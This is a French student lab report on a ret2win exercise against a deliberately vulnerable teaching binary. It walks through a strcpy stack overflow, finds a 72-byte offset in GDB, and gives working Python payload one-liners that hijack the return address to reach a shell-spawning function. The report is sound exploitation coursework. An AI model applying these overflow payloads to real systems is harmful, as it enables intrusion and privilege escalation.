# **Rapport ret2win**

## **Identification de la vulnérabilité**

La vulnérabilité est un stack buffer overflow, sa position dans le code se situe dans la fonction _vulnerable_function()_ et plus précisément à la ligne 22 _strcpy(buffer, input);_

## **Analyse**

Grâce à la commande info frame sous GDB, j'ai identifié que l'adresse de retour (Saved RIP) est stockée à l'adresse 0x7fffffffe578. Le buffer commençant à 0x7fffffffe530, le calcul de la distance nous donne **0x7fffffffe578 - 0x7fffffffe530 = 72** octets. Ainsi, il faut 72 octets de remplissage (padding) pour atteindre le bord du pointeur de retour. Tout octet envoyé après ces 72 octets contrôlera directement la destination du saut du programme.

## **Stratégie d'exploitation**

Lors de mes tests, l'utilisation de la fonction print() classique de Python a échoué. J'ai cherché un autre moyen et cela m'a donné **sys.stdout.buffer.write()** pour injecter l'adresse 0x4011f6 et surtout ne pas oublier d'ajouter le flag **b** avant le **"A"** et **"\xf6\x11\x40\x00"** pour que python les définisse comme une séquence d'octets bruts plutôt que comme une chaîne de caractères Unicode.

Le choix du _0x4011f6_ est simple car nous savons que **win_function** est _0x4011f6_.

Exemple avec print :

```
(gdb) run $(python3 -c 'print("A"*72 + "\xf6\x11\x40\x00")')

The program being debugged has been started already.

Start it from the beginning? (y or n) y

Starting program: /home/linux/MCS26-3_Cours_C_DO_Quoc_Tan/ret2win/ret2win $(python3 -c 'print("A"*72 + "\xf6\x11\x40\x00")')

/bin/bash: ligne 1: avertissement : substitution de commande: octet nul ignoré en entrée

[Thread debugging using libthread_db enabled]

Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

=== Programme pédagogique ret2win ===

Objectif: Overflow buffer pour exécuter win_function()



Buffer @ 0x7fffffffe530

win_function @ 0x4011f6

Buffer content: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA÷@



Program received signal SIGSEGV, Segmentation fault.

0x000000004011b7c3 in ?? ()

```

Avec la correction, nous avons la commande suivante qui donne le bon résultat:

**./ret2win $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"\*72 + b"\xf6\x11\x40\x00")')**

Avec la commande ci-dessus, nous avons ceci :

```
linux@linux-VirtualBox:~/MCS26-3_Cours_C_DO_Quoc_Tan/ret2win$ ./ret2win $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\xf6\x11\x40\x00")')

bash: avertissement : substitution de commande: octet nul ignoré en entrée

=== Programme pédagogique ret2win ===

Objectif: Overflow buffer pour exécuter win_function()



Buffer @ 0x7fff90450db0

win_function @ 0x4011f6

Buffer content: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@



🎉 SUCCÈS! Fonction win() exécutée!

Erreur de segmentation (core dumped)
```

**Ce n'est pas fini**, car nous avons encore un "core dumped", pour la suite on regards dans notre GDB avec un disass sur notre fonction **win_function** pour voir les détails:

```
(gdb) disass win_function

Dump of assembler code for function win_function:

   0x00000000004011f6 <+0>:	endbr64

   0x00000000004011fa <+4>:	push   %rbp

   0x00000000004011fb <+5>:	mov    %rsp,%rbp

   0x00000000004011fe <+8>:	push   %rbx

   0x00000000004011ff <+9>:	sub    $0x8,%rsp

   0x0000000000401203 <+13>:	lea    0xdfe(%rip),%rax        # 0x402008

   0x000000000040120a <+20>:	mov    %rax,%rdi

   0x000000000040120d <+23>:	call   0x4010b0 <puts@plt>

   0x0000000000401212 <+28>:	call   0x4010e0 <geteuid@plt>

   0x0000000000401217 <+33>:	mov    %eax,%ebx

   0x0000000000401219 <+35>:	call   0x4010e0 <geteuid@plt>

   0x000000000040121e <+40>:	mov    %ebx,%esi

   0x0000000000401220 <+42>:	mov    %eax,%edi

   0x0000000000401222 <+44>:	call   0x4010f0 <setreuid@plt>

   0x0000000000401227 <+49>:	lea    0xe04(%rip),%rax        # 0x402032

   0x000000000040122e <+56>:	mov    %rax,%rdi

   0x0000000000401231 <+59>:	call   0x4010c0 <system@plt>

   0x0000000000401236 <+64>:	mov    $0x0,%edi

   0x000000000040123b <+69>:	call   0x401100 <exit@plt>

End of assembler dump.
```

Le bon saut est **401203** car elle pointe juste après les instructions push et sub. En sautant là, on évite de modifier la pile. Elle reste donc parfaitement alignée sur 16 octets, permettant à system() de s'exécuter sans erreur.

## **Résultats**

```
linux@linux-VirtualBox:~/MCS26-3_Cours_C_DO_Quoc_Tan/ret2win$ ./ret2win $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\x03\x12\x40")')

=== Programme pédagogique ret2win ===

Objectif: Overflow buffer pour exécuter win_function()



Buffer @ 0x7fff4c98f400

win_function @ 0x4011f6

Buffer content: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@



🎉 SUCCÈS! Fonction win() exécutée!

$
```

DONC avec cette commande : **./ret2win $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"\*72 + b"\x03\x12\x40")')** nous avons réussi.

Avec le résultat, nous pouvons créer un script python **exploit.py** pour faire la même chose que nous avons fait manuellement.
